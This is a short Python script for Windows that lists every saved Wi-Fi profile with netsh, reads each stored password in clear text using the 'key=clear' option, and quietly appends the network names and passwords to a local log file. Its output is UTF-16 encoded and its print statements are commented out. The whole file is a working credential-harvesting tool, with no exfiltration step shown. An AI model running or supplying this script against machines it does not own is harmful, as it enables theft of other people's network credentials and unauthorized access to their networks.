import subprocess

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split("\n")
wifis = [line.split(":")[1][1:-1] for line in data if "All User Profile" in line]

for wifi in wifis:
	results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', wifi, 'key=clear']).decode('utf-8').split("\n")
	results = [line.split(":")[1][1:-1] for line in results if "Key Content" in line]
	try:
		file = open("log.csv","a")
		output = f"Name: {wifi}, Password: {results[0]}" + "\n"
		encode = output.encode(encoding = 'utf-16')
		plain_text = file.write(str(encode) + "\n")
		#encoded = plain_text.encode(encoding = 'utf-16')
		file.close()
		#print(f"Name: {wifi}, Password: {results[0]}")
	except IndexError:
		file = open("log.txt","a")
		file.write("Cannot be read")
		file.close()
		#print(f"Name: {wifi}, Password: Cannot be read")